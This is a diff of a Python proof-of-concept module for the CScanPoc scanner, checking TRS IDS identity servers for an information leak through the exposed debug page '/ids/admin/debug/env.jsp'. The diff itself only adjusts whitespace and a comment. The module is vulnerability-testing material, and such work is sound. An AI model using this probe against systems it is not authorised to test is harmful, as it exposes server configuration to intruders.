@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'TRS_0003'  # 平台漏洞编号，留空
     name = '拓尔思身份服务器系统 信息泄露'  # 漏洞名称
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     product = 'TRS IDS(拓尔思身份服务器系统)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '15a909c4-47ab-4793-9914-9cc46929cf2e'
     author = '47bwy'  # POC编写者
@@ -31,7 +33,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer: http://www.wooyun.org/bugs/wooyun-2013-039729
+            # refer: http://www.wooyun.org/bugs/wooyun-2013-039729
             hh = hackhttp.hackhttp()
             arg = self.target
             url = arg + '/ids/admin/debug/env.jsp'
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
